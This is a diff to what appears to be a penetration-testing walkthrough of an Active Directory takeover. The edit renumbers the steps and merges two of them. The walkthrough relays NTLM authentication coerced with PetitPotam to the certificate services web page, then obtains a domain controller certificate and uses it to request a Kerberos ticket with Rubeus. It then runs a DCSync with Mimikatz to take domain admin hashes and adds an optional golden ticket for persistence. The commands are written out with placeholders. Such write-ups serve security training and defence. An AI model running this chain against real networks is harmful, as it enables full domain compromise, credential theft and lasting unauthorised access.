@@ -36,16 +36,15 @@ A regular domain user with no special privileges.
 
 
 # Steps to Create
-1. Set up NTLM Relay on our attacker host
+1. Setting up NTLM Relay on our attacker host to forward authentication to ADCS Web UI
 2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine
-3. Relay authentication to ADCS Web UI
-4. Recieve base64 certificate for the domain controller's computer account
-5. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate
-6. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
-7. Grab any domain admin's hash to have code execution
-8. (Optional) create a golden ticket for persistence
+3. Recieve base64 certificate for the domain controller's computer account
+4. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate
+5. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
+6. Grab any domain admin's hash to have code execution
+7. (Optional) create a golden ticket for persistence
 
-# 1. Setting up NTLM Relay on our attacker host
+# 1. Setting up NTLM Relay on our attacker host to forward authentication to ADCS Web UI
 `ntlmrelayx.py -t http://<CAServer>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
 
 ![ntlm-relay-start](ntlm-relay-start.jpg)
@@ -55,13 +54,11 @@ A regular domain user with no special privileges.
 
 ![PetitPotam-Launched](PetitPotam-Launched.jpg)
 
-# 3. Relay authentication to ADCS Web UI
-
-# 4. Recieve base64 certificate for the domain controller's computer account
+# 3. Recieve base64 certificate for the domain controller's computer account
 
 ![got-dc2-cert](got-dc2-cert.jpg)
 
-# 5. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate
+# 4. use Rubeus.exe on the windows machine to request a TGT for that account using the certificate
 
 `.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`
 
@@ -69,16 +66,16 @@ A regular domain user with no special privileges.
 
 ![got-dc2-tgt](got-dc2-tgt.jpg)
 
-# 6. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
+# 5. *Having the TGT in memory,* use Mimikatz.exe to do a DCSync attack
 `lsadump::dcsync /domain:<DOMAINFQDN> /user:<TARGET_USER>`
 
 ![dcsync-for-domain-admin-hash](dcsync-for-domain-admin-hash.jpg)
 
-# 7. Grab any domain admin's hash to have code execution
+# 6. Grab any domain admin's hash to have code execution
 
 ![code-execution-as-administrator](code-execution-as-administrator.jpg)
 
-# 8. (Optional) create a golden ticket for persistence
+# 7. (Optional) create a golden ticket for persistence
 Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`
 
 ![domain-sid-lookup](domain-sid-lookup.jpg)
